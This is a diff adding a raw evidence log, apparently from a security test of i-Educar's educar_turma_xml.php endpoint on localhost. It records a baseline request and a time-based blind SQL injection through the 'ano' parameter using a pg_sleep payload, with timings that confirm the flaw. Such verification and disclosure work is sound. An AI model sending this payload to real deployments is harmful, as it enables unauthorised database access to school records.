@@ -1,0 +1,30 @@
+# i-explorar raw evidence
+# started_at: 2026-09-11T00:17:28.844980+00:00
+# host: -03
+# target: http://127.0.0.1:8080
+# payload: (SELECT 2026 FROM pg_sleep(2)) (read-only)
+
+### baseline: GET /intranet/educar_turma_xml.php?esc=2&ser=6&ano=2026
+HTTP 200 elapsed=0.077s
+
+--- body ---
+<?xml version="1.0" encoding="UTF-8"?>
+<query xmlns="sugestoes">
+  <turma cod_turma="3">1º ano (1º ano) Matutino - 2026</turma>
+  <turma cod_turma="12">1º ano (1º ano) Vespertino - 2026</turma>
+</query>
+--- end body ---
+
+### injection: GET /intranet/educar_turma_xml.php?esc=2&ser=6&ano=%28SELECT%202026%20FROM%20pg_sleep%282%29%29
+HTTP 200 elapsed=4.089s
+
+--- body ---
+<?xml version="1.0" encoding="UTF-8"?>
+<query xmlns="sugestoes">
+  <turma cod_turma="3">1º ano (1º ano) Matutino - 2026</turma>
+  <turma cod_turma="12">1º ano (1º ano) Vespertino - 2026</turma>
+</query>
+--- end body ---
+
+# delta=4.012s threshold=1.5s
+# finished_at: 2026-09-11T00:17:33.375258+00:00
